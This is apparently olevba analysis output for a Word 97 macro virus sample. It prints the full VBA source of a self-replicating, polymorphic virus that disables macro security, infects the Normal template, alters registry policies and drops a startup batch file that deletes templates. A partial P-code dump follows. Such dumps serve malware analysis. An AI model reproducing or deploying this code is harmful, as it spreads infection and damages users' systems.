olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Word97.MarySol v1.2
'(c) 1999 cry0tek

Private Sub Document_Open()
'MarySol
On Error Resume Next
Dim varray(1 To 14) As String
Dim Wt4Kg7Bj8Mu2Zx1Ih6Xt1 As Long: Dim Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 As Long: Dim Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 As Long: Dim Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 As Long
If Left(Application.Version, 1) > 9 Then
 CommandBars("Macro").Controls("Security...").Delete
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 Options.VirusProtection = (1 - 1)
End If
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (1 - 1): Application.EnableCancelKey = (1 - 1)
Application.ScreenUpdating = (1 - 1): Application.ShowVisualBasicEditor = (1 - 1)
If System.OperatingSystem = "Windows" And System.LanguageDesignation = "English (United States)" Then
 Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = GetAttr(NormalTemplate.FullName)
 If Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = vbReadOnly Then GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7
 If Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = vbReadOnly + vbArchive Then GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7
End If
Set Br6Jk8Hk1Nv4Ea8Rs4Tg8 = ActiveDocument.VBProject.VBComponents.Item(1).Codemodule
Set Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 = NormalTemplate.VBProject.VBComponents.Item(1).Codemodule
If Br6Jk8Hk1Nv4Ea8Rs4Tg8.Lines(5, 1) <> "'MarySol" Then
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.DeleteLines 1, _
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.InsertLines 1, Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.Lines _
 (1, Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines)
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
End If
If Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.Lines(5, 1) <> "'MarySol" Then
 Randomize
 varray(1) = "Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1": varray(2) = "Br6Jk8Hk1Nv4Ea8Rs4Tg8": varray(3) = "Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3": varray(4) = "Wt4Kg7Bj8Mu2Zx1Ih6Xt1": varray(5) = "Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6": varray(6) = "Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5": varray(7) = "Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6"
 varray(8) = "Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7": varray(9) = "Fm8": varray(10) = "Kr4Tl5Yk8Fe9": varray(11) = "Lh7Tu1Ki7Qc1": varray(12) = "Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7": varray(13) = "Wv2Ln0Ai5Uz9Nv1Bd8": varray(14) = "Ku0Yj6"
 For i = 1 To 14
  For j = 1 To Int((10 * Rnd) + 1)
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
  Next j
  With Br6Jk8Hk1Nv4Ea8Rs4Tg8
   Wt4Kg7Bj8Mu2Zx1Ih6Xt1 = 1: Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 = 1: Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 = .CountOfLines: Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), Wt4Kg7Bj8Mu2Zx1Ih6Xt1, Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6, Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5, Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6, True)
    strVal = .Lines(Wt4Kg7Bj8Mu2Zx1Ih6Xt1, 1)
    strVal = Left(strVal, Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 - 1) & PolyVal & Mid(strVal, Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6)
    .ReplaceLine Wt4Kg7Bj8Mu2Zx1Ih6Xt1, strVal
    Wt4Kg7Bj8Mu2Zx1Ih6Xt1 = Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 + 1: Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 = 1
    Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 = .CountOfLines: Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
 Next i
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.DeleteLines 1, _
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.InsertLines 1, Br6Jk8Hk1Nv4Ea8Rs4Tg8.Lines _
 (1, Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines)
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
End If
If Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines <> 0 And Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Day(Now) = Minute(Now) Then
 Select Case Day(Now)
  Case 3 And Int((15 * Rnd) + 1) = 1
   Application.StatusBar = "Word97.MarySol v1.2"
  Case 12 And Int((30 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Word97.MarySol v1.2"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 21 And Int((45 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
 End Select
End If
Exit Sub
Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7:
Fm8 = NormalTemplate
Ku0Yj6 = "c:\windows\startm~1\programs\startup\msexec.bat"
Kr4Tl5Yk8Fe9 = "attrib -h -r "
Lh7Tu1Ki7Qc1 = "c:\progra~1\micros~1\templa~1\"
Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 = "c:\progra~1\micros~2\templa~1\"
Wv2Ln0Ai5Uz9Nv1Bd8 = "del "
Open Ku0Yj6 For Append Access Write As #1
Print #1, vbCr + vbLf + "@echo off"
Print #1, Kr4Tl5Yk8Fe9 + Lh7Tu1Ki7Qc1 + Fm8
Print #1, Kr4Tl5Yk8Fe9 + Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 + Fm8
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Lh7Tu1Ki7Qc1 + Fm8
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 + Fm8
Print #1, "cls"
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Ku0Yj6
Close 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mary.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 16940 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0013 "Word97.MarySol v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x0010 "(c) 1999 cry0tek"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	QuoteRem 0x0000 0x0007 "MarySol"
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #7:
' 	Dim 
' 	VarDefn Wt4Kg7Bj8Mu2Zx1Ih6Xt1 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 (As Long)
' Line #8:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Gt 
' 	IfBlock 
' Line #9:
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #10:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #17:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0017 "English (United States)"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 
' Line #19:
' 	Ld Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7 
' 	EndIf 
' Line #20:
' 	Ld Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7 
' 	EndIf 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	Set Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	Set Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' Line #24:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'MarySol"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LineCont 0x0004 05 00 01 00
' 	LitDI2 0x0001 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	MemLd CountOfLines 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #26:
' 	LineCont 0x0004 08 00 01 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	MemLd CountOfLines 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	LineCont 0x0008 2D 00 01 00 5F 00 01 00
' 	LitDI2 0x0004 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'MarySol"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	ArgsCall Read 0x0000 
' Line #31:
' 	LitStr 0x001E "Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Br6Jk8Hk1Nv4Ea8Rs4Tg8"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001E "Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Wt4Kg7Bj8Mu2Zx1Ih6Xt1"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #32:
' 	LitStr 0x001B "Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Fm8"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Kr4Tl5Yk8Fe9"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Lh7Tu1Ki7Qc1"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x001B "Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Wv2Ln0Ai5Uz9Nv1Bd8"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Ku0Yj6"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #34:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #35:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #36:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	StartWithExpr 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	With 
' Line #38:
' 	LitDI2 0x0001 
' 	St Wt4Kg7Bj8Mu2Zx1Ih6Xt1 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 
' Line #39:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Wt4Kg7Bj8Mu2Zx1Ih6Xt1 
' 	Ld Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 
' 	Ld Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 
' 	Ld Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #40:
' 	Ld Wt4Kg7Bj8Mu2Zx1Ih6Xt1 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #41:
' 	Ld strVal 
' 	Ld Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #42:
' 	Ld Wt4Kg7Bj8Mu2Zx1Ih6Xt1 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #43:
' 	Ld Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 
' 	LitDI2 0x0001 
' 	Add 
' 	St Wt4Kg7Bj8Mu2Zx1Ih6Xt1 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 
' Line #44:
' 	MemLdWith CountOfLines 
' 	St Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 
' Line #45:
' 	Loop 
' Line #46:
' 	EndWith 
' Line #47:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	LineCont 0x0004 05 00 01 00
' 	LitDI2 0x0001 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	MemLd CountOfLines 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	LineCont 0x0004 08 00 01 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	MemLd CountOfLines 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	LineCont 0x0008 2D 00 01 00 5F 00 01 00
' 	LitDI2 0x0004 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Br6Jk8Hk1Nv4Ea8Rs4Tg8 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #54:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #55:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #56:
' 	LitDI2 0x0003 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #57:
' 	LitStr 0x0013 "Word97.MarySol v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #58:
' 	LitDI2 0x000C 
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #59:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #60:
' 	LitStr 0x0013 "Word97.MarySol v1.2"
' 	MemStWith Heading 
' Line #61:
' 	LitStr 0x0030 "So many questions, but the answers are so few..."
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #62:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #63:
' 	ArgsMemCallWith Show 0x0000 
' Line #64:
' 	EndWith 
' Line #65:
' 	LitDI2 0x0015 
' 	LitDI2 0x002D 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
